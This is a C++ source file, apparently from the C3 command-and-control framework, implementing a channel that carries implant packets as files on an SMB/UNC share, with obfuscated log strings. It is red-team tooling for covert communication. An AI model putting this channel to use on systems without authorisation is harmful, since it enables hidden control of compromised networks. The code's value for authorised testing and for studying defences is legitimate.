#include "StdAfx.h"
#include <random>
#include <fstream>
#include <sstream>
#include "UncShareFile.h"
#include "Common/MWR/Crypto/Base64.h"

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
MWR::C3::Interfaces::Channels::UncShareFile::UncShareFile(ByteView arguments)
	: m_InboundDirectionName{ arguments.Read<std::string>() }
	, m_OutboundDirectionName{ arguments.Read<std::string>() }
	, m_FilesystemPath{ arguments.Read<std::string>() }
{
	// If path doesn't exist, create it
	if (!std::filesystem::exists(m_FilesystemPath))
		std::filesystem::create_directories(m_FilesystemPath);

	// Check if additional flag to remove all tasks was provided.
	if (arguments.Read<uint8_t>())
	{
		Log({ OBF("Removing all existing file tasks."), LogMessage::Severity::Information });
		RemoveAllPackets();
	}
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
size_t MWR::C3::Interfaces::Channels::UncShareFile::OnSendToChannel(ByteView data)
{
	try
	{
		std::filesystem::path tmpFilePath;
		std::filesystem::path filePath;
		do
		{
			tmpFilePath = m_FilesystemPath / (m_OutboundDirectionName + std::to_string(MWR::Utils::GenerateRandomValue<int>(10000, 99999)) + ".tmp");
			filePath = tmpFilePath;
			filePath.replace_extension();
		} while (std::filesystem::exists(filePath) or std::filesystem::exists(tmpFilePath));

		{
			std::ofstream tmpFile(tmpFilePath, std::ios::trunc | std::ios::binary);
			tmpFile << std::string_view{ data };
		}
		std::filesystem::rename(tmpFilePath, filePath);

		Log({ OBF("OnSend() called for UncShareFile carrying ") + std::to_string(data.size()) + OBF(" bytes"), LogMessage::Severity::DebugInformation });
		return data.size();
	}
	catch (std::exception& exception)
	{
		throw std::runtime_error(OBF_STR("Caught a std::exception when writing to a file as part of OnSend: ") + exception.what());
		return 0u;
	}
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
MWR::ByteVector MWR::C3::Interfaces::Channels::UncShareFile::OnReceiveFromChannel()
{
	// Read a single packet from the oldest file that belongs to this channel

	std::vector<std::filesystem::path> channelFiles;
	for (auto&& directoryEntry : std::filesystem::directory_iterator(m_FilesystemPath))
	{
		if (BelongToChannel(directoryEntry.path()))
			channelFiles.emplace_back(directoryEntry.path());
	}

	if (channelFiles.empty())
		return {};

	auto oldestFile = std::min_element(channelFiles.begin(), channelFiles.end(), [](auto const& a, auto const& b) -> bool { return std::filesystem::last_write_time(a) < std::filesystem::last_write_time(b); });

	// Get the contents of the file and pass on. Return the packet even if removing the file failed.
	ByteVector packet;
	try
	{
		{
			std::ifstream readFile(oldestFile->generic_string(), std::ios::binary);
			packet = ByteVector{ std::istreambuf_iterator<char>{readFile}, {} };
		}

		RemoveFile(*oldestFile);
	}
	catch (std::exception& exception)
	{
		Log({ OBF("Caught a std::exception when processing contents of filename: ") + oldestFile->generic_string() + OBF(" : ") + exception.what(), LogMessage::Severity::Error });
	}

	return packet;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void MWR::C3::Interfaces::Channels::UncShareFile::RemoveAllPackets()
{
	// Iterate through the list of file tasks, removing each of them one by one.
	for (auto&& directoryEntry : std::filesystem::directory_iterator(m_FilesystemPath))
		if (BelongToChannel(directoryEntry))
			RemoveFile(directoryEntry.path());
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
bool MWR::C3::Interfaces::Channels::UncShareFile::BelongToChannel(std::filesystem::path const& path) const
{
	auto filename = path.filename().string();
	if (filename.size() < m_InboundDirectionName.size())
		return false;

	if (path.extension() == ".tmp")
		return false;

	auto startsWith = std::string_view{ filename }.substr(0, m_InboundDirectionName.size());
	return startsWith == m_InboundDirectionName;
}

void MWR::C3::Interfaces::Channels::UncShareFile::RemoveFile(std::filesystem::path const& path)
{
	for (auto i = 0; i < 10; ++i)
		try
		{
			if (std::filesystem::exists(path))
				std::filesystem::remove(path);

			break;
		}
		catch (std::exception& exception)
		{
			Log({ OBF("Caught a std::exception when deleting filename: ") + path.string() + OBF(" : ") + exception.what(), LogMessage::Severity::Error });
			std::this_thread::sleep_for(100ms);
		}
}


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
MWR::ByteVector MWR::C3::Interfaces::Channels::UncShareFile::OnRunCommand(ByteView command)
{
	auto commandCopy = command; //each read moves ByteView. CommandCoppy is needed  for default.
	switch (command.Read<uint16_t>())
	{
	case 0:
		RemoveAllPackets();
		return {};
	default:
		return AbstractChannel::OnRunCommand(commandCopy);
	}
}


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
MWR::ByteView MWR::C3::Interfaces::Channels::UncShareFile::GetCapability()
{
	return R"(
{
	"create":
	{
		"arguments":
		[
			[
				{
					"type": "string",
					"name": "Input ID",
					"randomize": true,
					"min": 4,
					"description": "Used to distinguish packets for the channel"
				},
				{
					"type": "string",
					"name": "Output ID",
					"randomize": true,
					"min": 4,
					"description": "Used to distinguish packets from the channel"
				}
			],
			{
				"type": "string",
				"name": "Filesystem path",
				"min": 1,
				"description": "UNC or absolute path of fileshare"
			},
			{
				"type": "boolean",
				"name": "Clear",
				"defaultValue": false,
				"description": "Clearing old files before starting communication may increase bandwidth"
			}
		]
	},
	"commands":
	[
		{
			"name": "Remove all message files",
			"id": 0,
			"description": "Clearing old files from directory may increase bandwidth",
			"arguments": []
		}
	]
}
)";
}
